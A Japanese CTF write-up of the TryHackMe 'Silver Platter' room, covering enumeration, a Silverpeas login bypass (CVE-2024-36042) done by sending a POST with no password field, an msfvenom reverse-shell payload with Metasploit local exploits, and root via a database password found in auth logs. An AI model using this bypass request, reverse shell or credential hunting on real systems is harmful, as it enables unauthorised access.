# Silver Platter CTF

https://tryhackme.com/r/room/silverplatter

ヒントとして、パスワードは rockyou.txt と照合して侵入されていないものが使われているとのこと。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.107.195
root@ip-10-10-22-216:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-11 09:44 GMT
Nmap scan report for 10.10.107.195
Host is up (0.00025s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 02:5C:8E:0D:5A:1B (Unknown)

root@ip-10-10-22-216:~# sudo nmap -sV -p22,80,8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-11 09:44 GMT
Nmap scan report for 10.10.107.195
Host is up (0.00020s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```

### gobuster

```shell
root@ip-10-10-22-216:~# gobuster dir -x=txt,php,html -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.107.195
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/LICENSE.txt          (Status: 200) [Size: 17128]
/README.txt           (Status: 200) [Size: 771]
/assets               (Status: 301) [Size: 178] [--> http://10.10.107.195/assets/]
/images               (Status: 301) [Size: 178] [--> http://10.10.107.195/images/]
/index.html           (Status: 200) [Size: 14124]
Progress: 81892 / 81896 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-22-216:~# gobuster dir -x=txt,php,html -u http://$TARGET:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.107.195:8080
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 302) [Size: 0] [--> /noredirect.html]
/website              (Status: 302) [Size: 0] [--> http://10.10.107.195:8080/website/]
Progress: 81892 / 81896 (100.00%)
===============================================================
Finished
===============================================================
```

#### 80

README.txt: Dimension by HTML5 UP  
LICENSE.txt: Creative Commons Attribution 3.0 Unported

#### 8080

/console: noredirect.html に転送されて何も表示されない  
/website: forbidden が表示される

## 80

### ホーム

```html
<!--
	Dimension by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->

<li><a href="#intro">Intro</a></li>
<li><a href="#work">Work</a></li>
<li><a href="#about">About</a></li>
<li><a href="#contact">Contact</a></li>
<!--<li><a href="#elements">Elements</a></li>-->
```

### intro

```text
Born out of a clandestine gathering of elite hackers, Hack Smarter Security operates on the cutting edge of technology, pushing the boundaries of what is thought to be possible in the digital landscape. Their members, often referred to as the "1337est" hackers, boast unparalleled skills in exploiting vulnerabilities, executing precision attacks, and navigating the intricate web of cyberspace. Known for their strategic brilliance, HSS has become a beacon for those who seek to challenge their own limits and engage in the ultimate battle of wits. As you embark on this CTF journey, prepare to unravel the mysteries of Hack Smarter Security and witness firsthand the extraordinary talents that have earned them the title of the true overlords of the virtual realm.
```

1337est, HSS というワードに注目。

### work

```text
We hack you before the real bad guys do. If you don't pay us, then we become the real bad guys so don't forget to pay your invoice!

If you're curious about our 1337 h4x0r skills and want to see them at work, visit our super secret YouTube Channel.
```

スーパーシークレット Youtube チャンネルとは・・・？

https://www.youtube.com/@TylerRamsbey  
スーパーシークレットっぽくはない。

### about

```text
Embark on the legendary saga of Hack Smarter Security, a brainchild meticulously crafted in the crucible of ambition by none other than the infamous maestro of the digital realm, Tyler Ramsbey. Picture this: a clandestine inception unfolding in the bowels of Tyler's basement, where the flicker of computer screens danced in rhythm with the heartbeat of cutting-edge hacking endeavors.

Driven by an insatiable thirst for cyber dominance, Tyler Ramsbey, the renegade genius, birthed Hack Smarter Security from the very essence of his try-hard spirit. The basement, a crucible of innovation, witnessed the forging of a cyber empire that stands as a testament to Tyler's unyielding commitment to the pursuit of digital excellence. Brace yourself for a narrative that transcends the ordinary, where every keystroke in that basement reverberates with the echoes of a try-hard journey towards the zenith of hacking prowess. Welcome to the epicenter of hacking innovation, where Hack Smarter Security emerged from the shadows, driven by the relentless try-hard ethos of its enigmatic founder, Tyler Ramsbey.
```

### contact

```text
If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```

Twitter, Facebook, Instagram, Github のアイコンがあるので、"scr1ptkiddy"で調べたら何か出るかもしれない。

X・・・@Scr1ptKiddy という人がいたけど関係なさそう。  
Facebook・・・それらしい人はいない  
Instagram・・・  
Github・・・ヒットしない

### elements

http://10.10.107.195/#elements

サンプル的なフォーム送信の画面が表示されるが、href=#なのでアクションが呼び出されない。  
デフォルトのメールアドレスが設定されているのが気になる。

https://html5up.net/uploads/demos/landed/elements.html には設定されていない。

```text
<div class="field half">
	<label for="demo-name">Name</label>
	<input type="text" name="demo-name" id="demo-name" value="" placeholder="Jane Doe" />
</div>
<div class="field half">
	<label for="demo-email">Email</label>
	<input type="email" name="demo-email" id="demo-email" value="" placeholder="jane@untitled.tld" />
</div>
```

## silverpeas

8080/silverpeas にアクセスしたら  
http://10.10.157.28:8080/silverpeas/defaultLogin.jsp  
でログイン画面が表示された。

https://www.silverpeas.org/installation/installationV6.html にデフォルト認証が書かれていたが、これではログインできなかった。

```
Once started, you can access Silverpeas through the following url: http://localhost:8000/silverpeas and by using the default credentials SilverAdmin/SilverAdmin.
```

### CVE-2024-36042

Google 検索で、ログイン画面認証バイパスの脆弱性が見つかった。バージョンは定かではないがこれを試してみる。

https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d

```http
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.10.157.28:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.10.157.28:8080
Connection: keep-alive
Referer: http://10.10.157.28:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
Cookie: JSESSIONID=nnziKNSUaLeh9sUfHei58g9h5T-Qy83bMS5jeO1A.ebabc79c6d2a
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

Login=SilverAdmin&DomainId=0
```

このようにパスワードフィールドを削除するだけで、認証バイパスして管理者としてログインできた。

PHP アップロードのような機能がないかと探したが見つからなかった。（フランス語が分からなかったので見落としているだけの可能性もある）

ユーザー一覧のようなページで、現在の SilverAdmin
以外に、Manager、scr1ptkiddy ユーザーが存在することが分かる。

Manager としてログインしたら認証情報を含むメッセージがあった。

```text
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes.

Username: tim
Password: cm0...................
```

これを使って SSH 接続できた。

```shell
tim@silver-platter:~$ cat ./user.txt
THM{c.......}
```

フラグ 1 ゲット

## 権限昇格

SUID

```shell
tim@silver-platter:~$ find / -perm -u=s -type f -ls 2>/dev/null
      849     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /snap/core20/2264/usr/bin/chfn
      855     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /snap/core20/2264/usr/bin/chsh
      925     87 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /snap/core20/2264/usr/bin/gpasswd
     1009     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/2264/usr/bin/mount
     1018     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /snap/core20/2264/usr/bin/newgrp
     1033     67 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /snap/core20/2264/usr/bin/passwd
     1143     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/2264/usr/bin/su
     1144    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/2264/usr/bin/sudo
     1202     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/2264/usr/bin/umount
     1291     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/2264/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1665    467 -rwsr-xr-x   1 root     root              477672 Jan  2  2024 /snap/core20/2264/usr/lib/openssh/ssh-keysign
      847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1974/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1974/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1974/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
      297    129 -rwsr-xr-x   1 root     root              131832 Sep 15  2023 /snap/snapd/20290/usr/lib/snapd/snap-confine
      297    129 -rwsr-xr-x   1 root     root              131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
   154778    332 -rwsr-xr-x   1 root     root              338536 Aug 24  2023 /usr/lib/openssh/ssh-keysign
   131731     36 -rwsr-xr--   1 root     messagebus         35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   140562    136 -rwsr-xr-x   1 root     root              138408 May 29  2023 /usr/lib/snapd/snap-confine
   130893     44 -rwsr-xr-x   1 root     root               44808 Nov 24  2022 /usr/bin/chsh
   131162     40 -rwsr-xr-x   1 root     root               40496 Nov 24  2022 /usr/bin/newgrp
   131001     36 -rwsr-xr-x   1 root     root               35200 Mar 23  2022 /usr/bin/fusermount3
   131196     60 -rwsr-xr-x   1 root     root               59976 Nov 24  2022 /usr/bin/passwd
   131150     48 -rwsr-xr-x   1 root     root               47480 Feb 21  2022 /usr/bin/mount
   131017     72 -rwsr-xr-x   1 root     root               72072 Nov 24  2022 /usr/bin/gpasswd
   131433    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
   131432     56 -rwsr-xr-x   1 root     root               55672 Feb 21  2022 /usr/bin/su
   130887     72 -rwsr-xr-x   1 root     root               72712 Nov 24  2022 /usr/bin/chfn
   131218     32 -rwsr-xr-x   1 root     root               30872 Feb 26  2022 /usr/bin/pkexec
   131508     36 -rwsr-xr-x   1 root     root               35192 Feb 21  2022 /usr/bin/umount
   144054     20 -rwsr-xr-x   1 root     root               18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
```

特になし。

```shell
tim@silver-platter:~$ sudo -l
[sudo] password for tim:
Sorry, user tim may not run sudo on silver-platter.
```

sudo なし。

いきなり root になる手掛かりは見つからない。tyler ユーザーを調べる。

```shell
tim@silver-platter:~$ cat /etc/passwd | grep tyler
tyler:x:1000:1000:root:/home/tyler:/bin/bash
```

ただのコメント部分ではあるが、root と書かれている。  
tyler ユーザー、グループの所有ファイル

```shell
tim@silver-platter:~$ find / -user tyler -type f 2>/dev/null
tim@silver-platter:~$ find / -group tyler -type f 2>/dev/null
```

何もなし。手がかりがない。

```shell
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)

tim@silver-platter:~$ id tyler
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

現在のユーザーが adm グループに入っていた。  
tyler は sudo にも入っている。

adm グループの所有ファイル

```shell
tim@silver-platter:~$ find / -group adm -type f 2>/dev/null
/var/log/kern.log
/var/log/syslog.3.gz
/var/log/kern.log.2.gz
/var/log/syslog.2.gz
/var/log/auth.log.1
/var/log/kern.log.1
/var/log/dmesg.4.gz
/var/log/dmesg
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
/var/log/apt/term.log.1.gz
/var/log/apt/term.log
/var/log/dmesg.3.gz
/var/log/syslog.1
/var/log/dmesg.0
/var/log/dmesg.2.gz
/var/log/installer/subiquity-client-info.log.2016
/var/log/installer/subiquity-server-debug.log.2061
/var/log/installer/curtin-install/subiquity-curthooks.conf
/var/log/installer/curtin-install/subiquity-initial.conf
/var/log/installer/curtin-install/subiquity-extract.conf
/var/log/installer/curtin-install/subiquity-partitioning.conf
/var/log/installer/subiquity-server-info.log.2061
/var/log/installer/autoinstall-user-data
/var/log/installer/subiquity-client-debug.log.2016
/var/log/installer/installer-journal.txt
/var/log/installer/cloud-init.log
/var/log/installer/subiquity-curtin-apt.conf
/var/log/nginx/access.log
/var/log/nginx/error.log.1
/var/log/nginx/access.log.2.gz
/var/log/nginx/access.log.1
/var/log/nginx/error.log
/var/log/cloud-init.log
/var/log/dmesg.1.gz
/var/log/syslog
/var/log/auth.log
/var/log/kern.log.3.gz
/var/log/cloud-init-output.log
/var/log/auth.log.2.gz
/var/log/auth.log.2
/etc/cloud/ds-identify.cfg
/etc/cloud/clean.d/99-installer
/etc/cloud/cloud.cfg.d/99-installer.cfg
/etc/hosts
/etc/hostname
```

### metasploit

手がかりが無いので meterpreter でサジェスターを使う

```shell
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.2.22.182 LPORT=4444 -f elf > shell.elf

$ msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 10.2.22.182; set LPORT 4444;exploit"

meterpreter > run post/multi/recon/local_exploit_suggester
```

```text
 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
 2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 4   exploit/linux/local/runc_cwd_priv_esc                               Yes                      The target appears to be vulnerable. Version of runc detected appears to be vulnerable: 1.1.7-0ubuntu1~22.04.1.
 5   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
```

#### exploit/linux/local/cve_2022_0847_dirtypipe

失敗

```shell
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set LPORT 4445
LPORT => 4445
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run

[*] Started reverse TCP handler on 10.2.22.182:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Linux kernel version found: 5.15.0
[*] Writing '/tmp/.jlqpfbi' (35592 bytes) ...
[*] Executing exploit '/tmp/.jlqpfbi /bin/passwd'
[*] Exploit completed, but no session was created.
```

#### exploit/linux/local/cve_2022_0995_watch_queue

失敗

```shell
msf6 exploit(linux/local/cve_2022_0995_watch_queue) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2022_0995_watch_queue) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/local/cve_2022_0995_watch_queue) > set LPORT 4445
LPORT => 4445
msf6 exploit(linux/local/cve_2022_0995_watch_queue) > run

[*] Started reverse TCP handler on 10.2.22.182:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[-] Exploit aborted due to failure: no-target: No offsets for '5.15.0-91-generic'
[*] Exploit completed, but no session was created.
```

#### linux/local/runc_cwd_priv_esc

失敗

```shell
msf6 exploit(linux/local/runc_cwd_priv_esc) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/runc_cwd_priv_esc) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/local/runc_cwd_priv_esc) > set LPORT 4445
LPORT => 4445
msf6 exploit(linux/local/runc_cwd_priv_esc) > run

[*] Started reverse TCP handler on 10.2.22.182:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version of runc detected appears to be vulnerable: 1.1.7-0ubuntu1~22.04.1.
[*] Building from Dockerfile to set our payload permissions
[-] Exploit aborted due to failure: no-access: Failed to build docker container. The user may not have docker permissions
[*] Exploit completed, but no session was created.
```

#### exploit/linux/local/su_login

失敗

```shell
msf6 exploit(linux/local/su_login) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/su_login) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/local/su_login) > set LPORT 4445
LPORT => 4445
msf6 exploit(linux/local/su_login) > run

[*] Started reverse TCP handler on 10.2.22.182:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Uploading payload to target
[*] Attempting to login with su
[*] Exploit completed, but no session was created.
```

これで全滅。

分からないので Linpeas を実行。

### Linpeas

SGID の下記ファイルが目立つ。

```shell
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
```

```shell
tim@silver-platter:/tmp$ file /usr/bin/write.ul
/usr/bin/write.ul: setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6bde8991b5a0dc7732c1bb6a6cc8b56882de2705, for GNU/Linux 3.2.0, stripped
```

strings で見える情報

```text
%s is not logged in
can't find your tty's name
%s has messages disabled
%s is not logged in on %s
effective gid does not match group of %s
Message from %s@%s (as %s) on %s at %02d:%02d ...
Message from %s@%s on %s at %02d:%02d ...
 %s [options] <user> [<ttyname>]
Send a message to another user.
Try '%s --help' for more information.
you have write permission turned off
%s is logged in more than once; writing to %s
%s has messages disabled on %s
```

```shell
tim@silver-platter:/tmp$ /usr/bin/write.ul
Try 'write.ul --help' for more information.
tim@silver-platter:/tmp$ /usr/bin/write.ul --help

Usage:
 write.ul [options] <user> [<ttyname>]

Send a message to another user.

Options:
 -h, --help     display this help
 -V, --version  display version

For more details see write(1).
```

ユーザーにメッセージを送れるということらしい。  
試しに、自分宛てに実行してみる。

```shell
tim@silver-platter:/tmp$ /usr/bin/write.ul tim

Message from tim@silver-platter on pts/0 at 08:54 ...

aaa
aaa
bbb
bbb
```

入力したテキストがそのまま表示される。  
tyler と root を指定してみる。

```shell
tim@silver-platter:/tmp$ /usr/bin/write.ul tyler
write.ul: tyler is not logged in
tim@silver-platter:/tmp$ /usr/bin/write.ul root
write.ul: root is not logged in
```

何にもならない。使い道がわからない。

### tyler で検索

tyler をキーワードとして、読めるファイルを全 Grep してみる。

```shell
find / -type f -exec grep -i -I "tyler" {} /dev/null \; 2>/dev/null
```

```text
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=<secret> -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
```

DB のパスワードがログに出ているのを見つけた。

このパスワードで tyler ユーザーになれた。

```shell
tim@silver-platter:/tmp$ su tyler
Password:
tyler@silver-platter:/tmp$
```

```shell
tyler@silver-platter:/tmp$ sudo -l
[sudo] password for tyler:
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

無制限 sudo が付いていた。

```shell
tyler@silver-platter:/tmp$ sudo bash -p
root@silver-platter:/tmp# whoami
root
root@silver-platter:/tmp# ls /root
root.txt  snap  start_docker_containers.sh
root@silver-platter:/tmp# cat /root/root.txt
THM{09..........}
```

## 振り返り

- 一番困ったのは、8080/silverpeas の URL を見つけるところ。
- 結果的には Contact ページの情報が重要だったということ。気になって 各 SNS で scr1ptkiddy は検索したのだが、SilverPeas の Web サイトは気付かなかった。
- tyler ユーザーが重要と認識した時点で、すぐに全 Grep をかけるべきだった。サジェスターや Linpeas は最後の手段であるべきで、手順前後。
